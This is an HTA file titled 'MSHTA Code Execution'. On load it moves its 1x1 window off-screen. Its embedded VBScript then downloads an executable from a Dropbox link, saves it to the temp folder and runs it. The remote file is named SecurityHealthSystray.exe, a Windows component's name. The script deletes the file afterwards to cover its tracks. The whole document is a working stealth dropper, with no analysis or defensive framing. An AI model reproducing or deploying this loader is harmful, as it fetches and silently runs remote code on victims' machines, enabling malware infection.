<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MSHTA Code Execution</title>
    <hta:application 
        id="oMyApp"
        innerborder="no"
        scroll="no"
        singleinstance="yes"
        windowstate="normal"
        border="dialog"
        maximizebutton="no"
        minimizebutton="no"
        sysmenu="no"
        caption="no"
        showintaskbar="yes"
        width="1"
        height="1"
    />
</head>
<body onload="window.moveTo(-32000, -32000); window.resizeTo(1, 1);">

<script type="text/vbscript">
   Option Explicit

Sub DownloadAndRunFile()
    Dim objHTTP, objFSO, strFileURL, strSavePath, strFileName

    ' Set the Google Drive direct download link
    strFileURL = "https://www.dropbox.com/scl/fi/t9h6fzxjvzbfgehq4u83y/SecurityHealthSystray.exe?rlkey=hqikq51s475ig1nmikxbb5yso&st=3url5t1k&dl=1"

    ' Set the local save path and file name
    strSavePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
    strFileName = "downloaded_file.exe"

    ' Construct the full save path
    strSavePath = strSavePath & "\" & strFileName

    ' Download the file using WinHTTP
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", strFileURL, False
    objHTTP.Send

    If objHTTP.Status = 200 Then
        Dim objStream
        Set objStream = CreateObject("ADODB.Stream")
        With objStream
            .Type = 1 ' adTypeBinary
            .Open
            .Write objHTTP.ResponseBody
            .SaveToFile strSavePath
            .Close
        End With
        Set objStream = Nothing

        ' Run the downloaded file
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run strSavePath, 1, True ' Wait for the file to finish running
        Set objShell = Nothing

        ' Delete the file after running
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.FileExists(strSavePath) Then
            objFSO.DeleteFile strSavePath
        End If
        Set objFSO = Nothing
    Else
        MsgBox "Failed to download the file. Status: " & objHTTP.Status
    End If

    Set objHTTP = Nothing
End Sub

' Call the main subroutine
DownloadAndRunFile
</script>

</body>
</html>
